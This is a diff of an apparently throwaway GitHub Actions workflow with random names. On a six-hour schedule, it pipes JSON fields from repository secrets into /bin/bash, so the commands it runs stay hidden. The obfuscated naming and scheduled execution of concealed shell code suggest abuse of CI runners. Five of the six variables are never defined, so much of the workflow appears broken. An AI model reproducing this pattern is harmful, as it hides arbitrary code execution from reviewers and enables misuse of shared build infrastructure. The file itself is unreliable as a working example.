@@ -3,21 +3,22 @@ name: maogechui4645
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 4/6 * * *'
+    - cron: '12 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: maogechui4645
         env:
-          f48799: ${{ secrets.f48799 }}
+          gv88302: ${{ secrets.gv88302 }}
         run: |
-          echo $f48799 | jq -r .w94132 | /bin/bash
-          echo $c3664 | jq -r .goyf9 | /bin/bash
-          echo $zgtqe28882 | jq -r .o3 | /bin/bash
-          echo $znsl14 | jq -r .fizye4 | /bin/bash
-          echo $mcw4977 | jq -r .xmv0987 | /bin/bash
-          echo $eq827 | jq -r .gub68 | /bin/bash
+          echo $gv88302 | jq -r .pkrre73950 | /bin/bash
+          echo $pg46859 | jq -r .wo40 | /bin/bash
+          echo $ycl8385 | jq -r .msf514 | /bin/bash
+          echo $l3 | jq -r .ra5074 | /bin/bash
+          echo $ynaks42 | jq -r .abd5 | /bin/bash
+          echo $t6 | jq -r .pulsv851 | /bin/bash
 
